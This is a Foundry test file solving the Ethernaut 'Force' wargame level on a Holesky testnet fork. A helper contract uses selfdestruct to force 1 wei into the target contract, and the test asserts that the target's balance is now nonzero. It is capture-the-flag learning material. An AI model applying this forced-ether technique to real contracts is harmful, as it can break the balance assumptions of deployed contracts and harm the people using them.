// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Force} from "../../src/Ethernaut/Force.sol";

// 坎昆升级之后selfdestruct已被弃用

contract ForceAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        Selfdestruct _selfdestruct = new Selfdestruct();
        _selfdestruct.force{value: 1}(
            0x099c2ddeAcfe7ABA5A03bf130B6181B3B5c8DeD7
        );
        vm.stopPrank();
        assertTrue(
            address(0x099c2ddeAcfe7ABA5A03bf130B6181B3B5c8DeD7).balance > 0
        );
    }
}

contract Selfdestruct {
    function force(address _to) public payable {
        selfdestruct(payable(_to));
    }
}
